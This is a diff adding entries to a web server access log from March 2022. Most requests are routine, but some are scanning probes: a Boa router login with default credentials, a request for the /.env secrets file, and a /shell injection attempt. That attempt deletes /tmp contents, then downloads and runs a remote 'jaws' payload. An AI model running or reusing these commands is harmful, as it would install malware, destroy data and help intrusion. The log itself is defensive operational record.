@@ -5357,3 +5357,10 @@
 [2022-03-13T13:06:09.831Z] "GET / HTTP/1.0" 426 - 0 0 0 - --79.33.167.92++ - - ?IP? -
 [2022-03-13T13:30:04.769Z] "GET / HTTP/1.0" 426 - 0 0 0 - --181.90.21.53++ - - ?IP? -
 [2022-03-13T13:55:58.777Z] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 426 - 0 0 0 - --114.233.34.160++ - - - -
+[2022-03-13T15:37:09.825Z] "GET / HTTP/1.1" 301 - 0 0 0 - 86.25.65.156 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" ? ?IP? -
+[2022-03-13T16:17:06.305Z] "GET / HTTP/1.1" 301 - 0 0 0 - 164.92.217.201 "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" ? ?IP? -
+[2022-03-13T16:32:22.515Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.122.27.188 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-13T16:32:24.526Z] "POST / HTTP/1.1" 301 - 0 0 0 - 20.122.27.188 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
+[2022-03-13T17:05:49.422Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+209.141.59.94/jaws;sh+/tmp/jaws HTTP/1.1" 301 - 0 0 0 - 184.190.50.67 "Hello, world" ? 127.0.0.1:80 -
+[2022-03-13T17:57:07.971Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --164.92.129.196++ - - - -
+[2022-03-13T18:27:37.062Z] "GET / HTTP/1.1" 301 - 0 0 0 - 81.97.227.36 - ? ?IP? -
